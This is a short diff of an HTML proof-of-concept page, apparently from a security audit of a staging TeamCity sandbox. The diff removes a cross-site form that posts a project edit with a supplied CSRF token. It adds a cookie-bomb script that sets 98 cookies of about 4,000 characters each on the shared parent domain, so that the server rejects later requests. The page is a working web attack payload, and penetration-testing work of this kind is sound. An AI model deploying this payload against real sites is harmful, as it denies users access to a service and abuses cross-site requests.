@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <body>
-    <h2>hello 3</h2>
-    <form action="https://cure53-2nd-2025.staging.sandbox.teamcity.aws.intellij.net/admin/editProject.html?projectId=Teaaa&tc-csrf-token=abcd" method="POST">
-        <input name="name" value="teaaa7"/>
-        <input name="externalId" value="Teaaa">
-    </form>
+    <h2>PoC</h2>
             <script>
+                    var base_domain = ".staging.sandbox.teamcity.aws.intellij.net"
+                    var pollution = Array(4000).join('a');
+                    for(var i=1;i<99;i++){
+                        document.cookie='bomb'+i+'='+pollution+';Domain='+base_domain+'; path=/';
+                    }
             </script>
 
 </body>
